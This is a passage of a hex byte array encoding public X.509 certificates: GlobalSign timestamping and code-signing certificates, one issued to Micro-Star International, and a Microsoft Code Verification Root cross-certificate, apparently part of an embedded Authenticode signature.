	  0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x53, 0x47, 0x31, 0x1f, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x04,
	  0x0a, 0x13, 0x16, 0x47, 0x4d, 0x4f, 0x20, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67,
	  0x6e, 0x20, 0x50, 0x74, 0x65, 0x20, 0x4c, 0x74, 0x64, 0x31, 0x30, 0x30, 0x2e, 0x06, 0x03, 0x55,
	  0x04, 0x03, 0x13, 0x27, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x54,
	  0x53, 0x41, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x4d, 0x53, 0x20, 0x41, 0x75, 0x74, 0x68, 0x65, 0x6e,
	  0x74, 0x69, 0x63, 0x6f, 0x64, 0x65, 0x20, 0x2d, 0x20, 0x47, 0x32, 0x30, 0x82, 0x01, 0x22, 0x30,
	  0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82,
	  0x01, 0x0f, 0x00, 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xb0, 0x17, 0xae, 0xa2,
	  0xd3, 0xb6, 0x04, 0x30, 0x56, 0x1e, 0x58, 0x0f, 0xb1, 0xed, 0x55, 0xa4, 0xd6, 0x54, 0xcb, 0xd8,
	  0xf6, 0x73, 0x3a, 0xec, 0x5d, 0x5e, 0xab, 0x25, 0xfd, 0x36, 0xa5, 0xfa, 0x84, 0xc3, 0x61, 0x40,
	  0xc5, 0x46, 0xb5, 0x59, 0x52, 0x3b, 0x42, 0xa2, 0x2e, 0x5f, 0x13, 0x62, 0x10, 0xa9, 0x5b, 0xe6,
	  0x73, 0xd6, 0x92, 0x25, 0xb1, 0x7d, 0x23, 0xe3, 0x06, 0xb3, 0x87, 0x3a, 0x0e, 0x43, 0xf0, 0xd7,
	  0x00, 0x89, 0x53, 0xa2, 0x11, 0x31, 0x52, 0x28, 0x6e, 0x5d, 0x40, 0x72, 0x3c, 0xf2, 0x09, 0x77,
	  0xa7, 0x49, 0x92, 0x97, 0xd4, 0x6c, 0x90, 0xa0, 0x76, 0xa7, 0xfd, 0xb8, 0xdc, 0xb3, 0x9d, 0xf2,
	  0x07, 0x60, 0x2c, 0x4f, 0x58, 0x98, 0x00, 0x6b, 0xd3, 0x15, 0x54, 0xe0, 0xfa, 0xdd, 0xff, 0x80,
	  0x2c, 0x5f, 0x18, 0xa6, 0x98, 0xff, 0xd4, 0xab, 0xec, 0xa1, 0x45, 0x59, 0xb2, 0x2e, 0x6f, 0x62,
	  0x5d, 0xe0, 0xd9, 0x19, 0xac, 0x8b, 0x57, 0x9c, 0xa8, 0x26, 0x2b, 0xd9, 0x17, 0xa5, 0x10, 0xd2,
	  0x47, 0x08, 0x1a, 0x70, 0x2c, 0x33, 0x8b, 0x7f, 0x68, 0x80, 0x2a, 0xb5, 0xa1, 0x5d, 0x6b, 0xdd,
	  0x8d, 0x02, 0x02, 0x29, 0x03, 0xaa, 0x7c, 0x37, 0xbb, 0xbb, 0x29, 0x4e, 0x3d, 0x53, 0x93, 0xb3,
	  0xa6, 0xfa, 0x8f, 0xd2, 0x58, 0x93, 0x15, 0x4c, 0xb9, 0x2d, 0xab, 0x80, 0xa3, 0xa3, 0x25, 0xfb,
	  0xaf, 0xf7, 0x08, 0x64, 0xb0, 0x7a, 0x44, 0x0f, 0x5c, 0x10, 0xd7, 0x5f, 0x61, 0x37, 0xaa, 0x4e,
	  0x6b, 0xd3, 0xd2, 0x53, 0x25, 0x9d, 0x82, 0x73, 0xfa, 0x2c, 0xf9, 0x72, 0xb0, 0xa9, 0x19, 0x39,
	  0x2a, 0x50, 0xfa, 0xa9, 0xd0, 0x3c, 0x3a, 0xca, 0xe8, 0x5b, 0xef, 0xf5, 0x5f, 0x51, 0xf4, 0xf9,
	  0x0a, 0xd9, 0x97, 0x35, 0xde, 0x6a, 0x85, 0xe6, 0x23, 0x04, 0x42, 0xaf, 0x02, 0x03, 0x01, 0x00,
	  0x01, 0xa3, 0x82, 0x01, 0x5f, 0x30, 0x82, 0x01, 0x5b, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x1d, 0x0f,
	  0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x07, 0x80, 0x30, 0x4c, 0x06, 0x03, 0x55, 0x1d, 0x20,
	  0x04, 0x45, 0x30, 0x43, 0x30, 0x41, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0xa0, 0x32, 0x01,
	  0x1e, 0x30, 0x34, 0x30, 0x32, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01, 0x16,
	  0x26, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x67, 0x6c, 0x6f,
	  0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x72, 0x65, 0x70, 0x6f,
	  0x73, 0x69, 0x74, 0x6f, 0x72, 0x79, 0x2f, 0x30, 0x09, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x04, 0x02,
	  0x30, 0x00, 0x30, 0x16, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x01, 0x01, 0xff, 0x04, 0x0c, 0x30, 0x0a,
	  0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x08, 0x30, 0x42, 0x06, 0x03, 0x55, 0x1d,
	  0x1f, 0x04, 0x3b, 0x30, 0x39, 0x30, 0x37, 0xa0, 0x35, 0xa0, 0x33, 0x86, 0x31, 0x68, 0x74, 0x74,
	  0x70, 0x3a, 0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69,
	  0x67, 0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x67, 0x73, 0x2f, 0x67, 0x73, 0x74, 0x69, 0x6d, 0x65,
	  0x73, 0x74, 0x61, 0x6d, 0x70, 0x69, 0x6e, 0x67, 0x67, 0x32, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x54,
	  0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x48, 0x30, 0x46, 0x30, 0x44,
	  0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x38, 0x68, 0x74, 0x74, 0x70,
	  0x3a, 0x2f, 0x2f, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c,
	  0x73, 0x69, 0x67, 0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x63, 0x61, 0x63, 0x65, 0x72, 0x74, 0x2f,
	  0x67, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x74, 0x61, 0x6d, 0x70, 0x69, 0x6e, 0x67, 0x67, 0x32,
	  0x2e, 0x63, 0x72, 0x74, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0xd4,
	  0xa2, 0x84, 0x4a, 0x38, 0x5a, 0x18, 0x7f, 0xba, 0x4f, 0x30, 0x50, 0xbd, 0x9d, 0xd5, 0x7a, 0x87,
	  0xd6, 0x09, 0xf7, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14,
	  0x46, 0xd8, 0x3e, 0xff, 0xdc, 0xe3, 0xbe, 0xff, 0x83, 0xe6, 0xf4, 0x85, 0x9b, 0xb0, 0xdd, 0x6a,
	  0xd6, 0x14, 0xa9, 0xc1, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01,
	  0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x8f, 0xa9, 0x1a, 0x91, 0x6d, 0x04, 0xa6, 0x37,
	  0x20, 0x0e, 0x83, 0x96, 0xde, 0x23, 0xd3, 0x6b, 0x6e, 0x1f, 0x6e, 0xdd, 0x64, 0x3d, 0x68, 0x21,
	  0x22, 0xb5, 0xf8, 0x47, 0x36, 0x69, 0x8e, 0xe1, 0xa5, 0x45, 0xc7, 0x24, 0xa2, 0x22, 0xb7, 0x29,
	  0x09, 0xcc, 0x54, 0x5a, 0xae, 0xc6, 0xbc, 0xcd, 0x63, 0x8e, 0xb3, 0x3d, 0x50, 0x48, 0xe5, 0xb4,
	  0xcc, 0xae, 0xcd, 0x92, 0x8d, 0x9e, 0x28, 0x8b, 0x13, 0x4a, 0x11, 0xaa, 0xbd, 0xa3, 0xef, 0xd3,
	  0xb2, 0x36, 0xfc, 0xb4, 0xa1, 0x72, 0xbf, 0x6d, 0x97, 0x63, 0x79, 0x8c, 0x44, 0xbc, 0x70, 0x2f,
	  0x7e, 0xf3, 0xbc, 0xdd, 0x82, 0x53, 0xab, 0x1a, 0xf6, 0xeb, 0xfa, 0x1c, 0x97, 0xbc, 0xb6, 0x37,
	  0x9c, 0xa4, 0x1c, 0x30, 0xbc, 0xab, 0xbc, 0x2d, 0x47, 0x36, 0xdf, 0x92, 0x20, 0x03, 0xe8, 0x71,
	  0xc6, 0x58, 0xf6, 0x75, 0x05, 0x9a, 0x34, 0xf0, 0x0b, 0x59, 0x5a, 0x82, 0x44, 0x34, 0xaa, 0x80,
	  0xe4, 0x2f, 0x84, 0xf6, 0x47, 0x5d, 0x96, 0xc9, 0xb6, 0xca, 0xca, 0x9d, 0xb7, 0xa6, 0xba, 0xe4,
	  0x50, 0xd3, 0xd4, 0x37, 0xb8, 0xba, 0x20, 0x0e, 0xd0, 0xd3, 0x92, 0x2a, 0x5b, 0xc4, 0x59, 0xbb,
	  0xa1, 0x6d, 0xdb, 0x3c, 0xce, 0x44, 0x9d, 0xc1, 0x38, 0x2a, 0xad, 0xe3, 0x8d, 0xbd, 0xcd, 0x09,
	  0x77, 0x1a, 0x10, 0xbe, 0x67, 0x0a, 0x02, 0x36, 0x64, 0x88, 0xb9, 0xb3, 0x1b, 0x26, 0xee, 0xe7,
	  0x9e, 0x60, 0xc4, 0x46, 0xa8, 0xbc, 0x61, 0x33, 0x6c, 0xcf, 0x4e, 0xb9, 0x9c, 0xb9, 0x6a, 0xf0,
	  0x9f, 0x37, 0xfe, 0xb5, 0x3d, 0x4f, 0x9a, 0xd3, 0x4d, 0xff, 0xde, 0x20, 0x8e, 0x4e, 0x97, 0xa6,
	  0xfd, 0x9f, 0x09, 0xbc, 0x4d, 0xca, 0x18, 0x76, 0xc9, 0xb0, 0x4d, 0x85, 0x50, 0xf2, 0x80, 0xd2,
	  0x1d, 0x06, 0xf5, 0x58, 0x04, 0x07, 0xb1, 0x18, 0x30, 0x82, 0x05, 0x2a, 0x30, 0x82, 0x04, 0x12,
	  0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x12, 0x11, 0x21, 0x58, 0x04, 0x48, 0x63, 0xe4, 0xdc, 0x19,
	  0xcf, 0x29, 0xa8, 0x56, 0x68, 0xb7, 0xf4, 0x58, 0x42, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48,
	  0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x51, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03,
	  0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a,
	  0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d,
	  0x73, 0x61, 0x31, 0x27, 0x30, 0x25, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x1e, 0x47, 0x6c, 0x6f,
	  0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e, 0x20, 0x43, 0x6f, 0x64, 0x65, 0x53, 0x69, 0x67, 0x6e,
	  0x69, 0x6e, 0x67, 0x20, 0x43, 0x41, 0x20, 0x2d, 0x20, 0x47, 0x32, 0x30, 0x1e, 0x17, 0x0d, 0x31,
	  0x34, 0x30, 0x36, 0x30, 0x33, 0x30, 0x39, 0x31, 0x36, 0x31, 0x35, 0x5a, 0x17, 0x0d, 0x31, 0x37,
	  0x30, 0x39, 0x30, 0x33, 0x30, 0x39, 0x31, 0x36, 0x31, 0x35, 0x5a, 0x30, 0x81, 0xbf, 0x31, 0x0b,
	  0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x54, 0x57, 0x31, 0x0f, 0x30, 0x0d, 0x06,
	  0x03, 0x55, 0x04, 0x08, 0x13, 0x06, 0x54, 0x61, 0x69, 0x77, 0x61, 0x6e, 0x31, 0x18, 0x30, 0x16,
	  0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x0f, 0x4e, 0x65, 0x77, 0x20, 0x54, 0x61, 0x69, 0x70, 0x65,
	  0x69, 0x20, 0x43, 0x69, 0x74, 0x79, 0x31, 0x2b, 0x30, 0x29, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13,
	  0x22, 0x4d, 0x49, 0x43, 0x52, 0x4f, 0x2d, 0x53, 0x54, 0x41, 0x52, 0x20, 0x49, 0x4e, 0x54, 0x45,
	  0x52, 0x4e, 0x41, 0x54, 0x49, 0x4f, 0x4e, 0x41, 0x4c, 0x20, 0x43, 0x4f, 0x2e, 0x2c, 0x20, 0x4c,
	  0x54, 0x44, 0x2e, 0x31, 0x2b, 0x30, 0x29, 0x06, 0x03, 0x55, 0x04, 0x0b, 0x13, 0x22, 0x4d, 0x49,
	  0x43, 0x52, 0x4f, 0x2d, 0x53, 0x54, 0x41, 0x52, 0x20, 0x49, 0x4e, 0x54, 0x45, 0x52, 0x4e, 0x41,
	  0x54, 0x49, 0x4f, 0x4e, 0x41, 0x4c, 0x20, 0x43, 0x4f, 0x2e, 0x2c, 0x20, 0x4c, 0x54, 0x44, 0x2e,
	  0x31, 0x2b, 0x30, 0x29, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x22, 0x4d, 0x49, 0x43, 0x52, 0x4f,
	  0x2d, 0x53, 0x54, 0x41, 0x52, 0x20, 0x49, 0x4e, 0x54, 0x45, 0x52, 0x4e, 0x41, 0x54, 0x49, 0x4f,
	  0x4e, 0x41, 0x4c, 0x20, 0x43, 0x4f, 0x2e, 0x2c, 0x20, 0x4c, 0x54, 0x44, 0x2e, 0x30, 0x82, 0x01,
	  0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00,
	  0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xd3, 0x44,
	  0xca, 0x36, 0xe2, 0xa4, 0xb3, 0x01, 0x06, 0x8a, 0xae, 0x6a, 0x67, 0x18, 0x59, 0x09, 0xcb, 0xec,
	  0xe0, 0xdd, 0x08, 0x95, 0xa0, 0x06, 0x9e, 0xb5, 0x3d, 0x13, 0xc9, 0x3f, 0x64, 0x80, 0x6a, 0x17,
	  0xbe, 0x17, 0xc8, 0x5c, 0x7a, 0x9f, 0x4e, 0x55, 0x16, 0xa4, 0x62, 0xbb, 0xe7, 0xa3, 0x1c, 0x8d,
	  0xde, 0xf5, 0x92, 0xbb, 0x3b, 0x14, 0xfb, 0x11, 0xbb, 0x17, 0xc6, 0x26, 0xa0, 0x55, 0x94, 0x99,
	  0xa9, 0x11, 0xb2, 0xa5, 0x34, 0x0d, 0xa5, 0x46, 0x96, 0x90, 0x09, 0x6a, 0x12, 0xff, 0xce, 0xd3,
	  0x2d, 0x49, 0x26, 0xdc, 0x59, 0x1a, 0xa6, 0xd2, 0x29, 0xa1, 0xf1, 0x07, 0x39, 0x1d, 0xd0, 0x66,
	  0x01, 0x47, 0x44, 0x9c, 0x4f, 0x7f, 0x65, 0xbf, 0x89, 0x2a, 0x40, 0x10, 0x9c, 0x01, 0x11, 0x50,
	  0xdc, 0xd5, 0x47, 0xe3, 0x7a, 0x29, 0xc5, 0x78, 0xa2, 0xae, 0x74, 0x05, 0x5b, 0x72, 0x95, 0xbf,
	  0x7b, 0x27, 0x21, 0xf7, 0x5f, 0xa4, 0xd2, 0x37, 0x6b, 0xa1, 0x0b, 0xe4, 0x21, 0x0a, 0xd4, 0xb7,
	  0x13, 0xa4, 0x3f, 0xbb, 0xbe, 0x97, 0xb2, 0xeb, 0xe0, 0xcb, 0x39, 0x17, 0xf3, 0xb0, 0x96, 0x01,
	  0x9c, 0x79, 0x77, 0x4f, 0x84, 0xcf, 0x89, 0x0b, 0x89, 0x3a, 0xe0, 0x1b, 0x54, 0x63, 0x2a, 0xcb,
	  0xaf, 0x60, 0xc1, 0x6f, 0xe1, 0xad, 0x44, 0x5e, 0x78, 0x7a, 0xd2, 0x17, 0xf6, 0x0d, 0xcf, 0x4a,
	  0xb4, 0xca, 0x63, 0x27, 0xca, 0x5a, 0xf7, 0xba, 0x5b, 0x3f, 0xc2, 0xf4, 0xd7, 0xdd, 0xab, 0x76,
	  0x7e, 0xd8, 0x2f, 0x2e, 0x0d, 0x87, 0x30, 0x55, 0xcd, 0xc2, 0x72, 0x57, 0xe8, 0xbb, 0x2b, 0xf4,
	  0xca, 0x19, 0xed, 0x0d, 0x84, 0xa4, 0xb9, 0xdf, 0xbc, 0x1b, 0x80, 0x3c, 0x91, 0x2f, 0x41, 0xf7,
	  0x32, 0xfd, 0x4e, 0x31, 0xe1, 0xec, 0x83, 0x19, 0x07, 0x91, 0xfc, 0x62, 0x40, 0xa7, 0x02, 0x03,
	  0x01, 0x00, 0x01, 0xa3, 0x82, 0x01, 0x8b, 0x30, 0x82, 0x01, 0x87, 0x30, 0x0e, 0x06, 0x03, 0x55,
	  0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x07, 0x80, 0x30, 0x4c, 0x06, 0x03, 0x55,
	  0x1d, 0x20, 0x04, 0x45, 0x30, 0x43, 0x30, 0x41, 0x06, 0x09, 0x2b, 0x06, 0x01, 0x04, 0x01, 0xa0,
	  0x32, 0x01, 0x32, 0x30, 0x34, 0x30, 0x32, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02,
	  0x01, 0x16, 0x26, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x67,
	  0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x72, 0x65,
	  0x70, 0x6f, 0x73, 0x69, 0x74, 0x6f, 0x72, 0x79, 0x2f, 0x30, 0x09, 0x06, 0x03, 0x55, 0x1d, 0x13,
	  0x04, 0x02, 0x30, 0x00, 0x30, 0x13, 0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06,
	  0x08, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x03, 0x30, 0x3e, 0x06, 0x03, 0x55, 0x1d, 0x1f,
	  0x04, 0x37, 0x30, 0x35, 0x30, 0x33, 0xa0, 0x31, 0xa0, 0x2f, 0x86, 0x2d, 0x68, 0x74, 0x74, 0x70,
	  0x3a, 0x2f, 0x2f, 0x63, 0x72, 0x6c, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67,
	  0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x67, 0x73, 0x2f, 0x67, 0x73, 0x63, 0x6f, 0x64, 0x65, 0x73,
	  0x69, 0x67, 0x6e, 0x67, 0x32, 0x2e, 0x63, 0x72, 0x6c, 0x30, 0x81, 0x86, 0x06, 0x08, 0x2b, 0x06,
	  0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x7a, 0x30, 0x78, 0x30, 0x40, 0x06, 0x08, 0x2b, 0x06,
	  0x01, 0x05, 0x05, 0x07, 0x30, 0x02, 0x86, 0x34, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x73,
	  0x65, 0x63, 0x75, 0x72, 0x65, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67, 0x6e,
	  0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x63, 0x61, 0x63, 0x65, 0x72, 0x74, 0x2f, 0x67, 0x73, 0x63, 0x6f,
	  0x64, 0x65, 0x73, 0x69, 0x67, 0x6e, 0x67, 0x32, 0x2e, 0x63, 0x72, 0x74, 0x30, 0x34, 0x06, 0x08,
	  0x2b, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x01, 0x86, 0x28, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f,
	  0x2f, 0x6f, 0x63, 0x73, 0x70, 0x32, 0x2e, 0x67, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x73, 0x69, 0x67,
	  0x6e, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x67, 0x73, 0x63, 0x6f, 0x64, 0x65, 0x73, 0x69, 0x67, 0x6e,
	  0x67, 0x32, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x00, 0x47, 0x2f,
	  0x90, 0x82, 0xd8, 0x12, 0xa5, 0xd4, 0xa4, 0xef, 0x19, 0xb5, 0xaa, 0xd6, 0x75, 0x30, 0xcf, 0xbc,
	  0x5d, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x08, 0x6e,
	  0xd8, 0xb6, 0x9c, 0x8a, 0xbf, 0xed, 0x3e, 0xd7, 0xc3, 0x74, 0x5d, 0xcc, 0x80, 0x1f, 0xa8, 0x2f,
	  0x50, 0x7a, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05,
	  0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x8c, 0x35, 0xa5, 0xb5, 0xd3, 0x50, 0x3f, 0x50, 0x11, 0x9a,
	  0xb8, 0xf9, 0x9b, 0x07, 0xa4, 0xbb, 0x4b, 0x71, 0xca, 0xfa, 0xf9, 0x83, 0x20, 0x6f, 0x74, 0x45,
	  0x45, 0xc2, 0x99, 0x7a, 0xe1, 0x76, 0x20, 0x32, 0xfa, 0x2d, 0x37, 0xf4, 0x78, 0x0c, 0xfe, 0x83,
	  0xbf, 0xa9, 0x99, 0xd7, 0xbc, 0xbd, 0x86, 0x3d, 0xc4, 0xa5, 0x1f, 0xf3, 0x99, 0x78, 0x16, 0x0e,
	  0x2e, 0x19, 0x14, 0x82, 0xae, 0x6d, 0x7f, 0x08, 0xe8, 0xff, 0xa3, 0x37, 0xc9, 0x6d, 0x8c, 0x2d,
	  0x38, 0xdd, 0xf4, 0x76, 0xa4, 0x97, 0x26, 0x5a, 0x89, 0x0c, 0x1b, 0xbf, 0x0d, 0xee, 0x89, 0xb1,
	  0xab, 0xd3, 0x23, 0x43, 0x88, 0x9a, 0x37, 0x57, 0x73, 0x2d, 0x20, 0x5b, 0xa0, 0x65, 0x25, 0xfa,
	  0x8f, 0x6e, 0x15, 0x00, 0x54, 0x05, 0xa5, 0x3e, 0x55, 0xce, 0xf7, 0x1a, 0xc0, 0xb6, 0xaf, 0x3a,
	  0x64, 0x0e, 0x4c, 0x8a, 0xef, 0x5e, 0x95, 0x0a, 0xb8, 0xa8, 0xb5, 0xc8, 0xbc, 0xdd, 0xb2, 0xad,
	  0xe9, 0x6a, 0xd9, 0x47, 0x3a, 0x3d, 0x86, 0x0a, 0xe1, 0x6f, 0xdb, 0xe3, 0x36, 0x2c, 0xab, 0xfd,
	  0x91, 0x6d, 0xa0, 0x89, 0x16, 0x7d, 0x90, 0x6d, 0x37, 0x8d, 0xbf, 0x45, 0x34, 0xf7, 0xff, 0xb7,
	  0x7d, 0x87, 0xba, 0xba, 0x29, 0xf8, 0xf5, 0xbb, 0xbd, 0x9b, 0x4b, 0x7c, 0x12, 0x7a, 0xc1, 0x70,
	  0xa2, 0x70, 0xdc, 0x7a, 0x72, 0x72, 0xd3, 0x8f, 0xdf, 0x3b, 0xba, 0xdb, 0xfb, 0x44, 0x8d, 0x47,
	  0xe5, 0xdd, 0x4d, 0x31, 0x0a, 0x58, 0x86, 0x66, 0xa0, 0xd6, 0x67, 0x62, 0xe1, 0xb3, 0x70, 0x4b,
	  0x1e, 0x00, 0xe3, 0x97, 0x39, 0x19, 0x0c, 0x02, 0xf4, 0xb9, 0x81, 0xcf, 0x2d, 0x27, 0xba, 0x07,
	  0xd2, 0x47, 0x2e, 0xc3, 0x20, 0xed, 0xf2, 0x9e, 0x26, 0x3f, 0x26, 0x27, 0x89, 0x95, 0xd1, 0x62,
	  0x10, 0x29, 0x68, 0xc9, 0x99, 0xb3, 0x30, 0x82, 0x05, 0x7f, 0x30, 0x82, 0x03, 0x67, 0xa0, 0x03,
	  0x02, 0x01, 0x02, 0x02, 0x0a, 0x61, 0x0b, 0x7f, 0x6b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x19, 0x30,
	  0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x7f,
	  0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x13, 0x30,
	  0x11, 0x06, 0x03, 0x55, 0x04, 0x08, 0x13, 0x0a, 0x57, 0x61, 0x73, 0x68, 0x69, 0x6e, 0x67, 0x74,
	  0x6f, 0x6e, 0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x07, 0x13, 0x07, 0x52, 0x65, 0x64,
	  0x6d, 0x6f, 0x6e, 0x64, 0x31, 0x1e, 0x30, 0x1c, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x15, 0x4d,
	  0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x20, 0x43, 0x6f, 0x72, 0x70, 0x6f, 0x72, 0x61,
	  0x74, 0x69, 0x6f, 0x6e, 0x31, 0x29, 0x30, 0x27, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x20, 0x4d,
	  0x69, 0x63, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x20, 0x43, 0x6f, 0x64, 0x65, 0x20, 0x56, 0x65,
	  0x72, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x30,
	  0x1e, 0x17, 0x0d, 0x30, 0x36, 0x30, 0x35, 0x32, 0x33, 0x31, 0x37, 0x30, 0x30, 0x35, 0x31, 0x5a,
	  0x17, 0x0d, 0x31, 0x36, 0x30, 0x35, 0x32, 0x33, 0x31, 0x37, 0x31, 0x30, 0x35, 0x31, 0x5a, 0x30,
	  0x57, 0x31, 0x0b, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19,
	  0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x13, 0x10, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53,
	  0x69, 0x67, 0x6e, 0x20, 0x6e, 0x76, 0x2d, 0x73, 0x61, 0x31, 0x10, 0x30, 0x0e, 0x06, 0x03, 0x55,
	  0x04, 0x0b, 0x13, 0x07, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41, 0x31, 0x1b, 0x30, 0x19, 0x06,
	  0x03, 0x55, 0x04, 0x03, 0x13, 0x12, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x53, 0x69, 0x67, 0x6e,
	  0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09,
	  0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00,
	  0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xda, 0x0e, 0xe6, 0x99, 0x8d, 0xce, 0xa3,
	  0xe3, 0x4f, 0x8a, 0x7e, 0xfb, 0xf1, 0x8b, 0x83, 0x25, 0x6b, 0xea, 0x48, 0x1f, 0xf1, 0x2a, 0xb0,
	  0xb9, 0x95, 0x11, 0x04, 0xbd, 0xf0, 0x63, 0xd1, 0xe2, 0x67, 0x66, 0xcf, 0x1c, 0xdd, 0xcf, 0x1b,
	  0x48, 0x2b, 0xee, 0x8d, 0x89, 0x8e, 0x9a, 0xaf, 0x29, 0x80, 0x65, 0xab, 0xe9, 0xc7, 0x2d, 0x12,
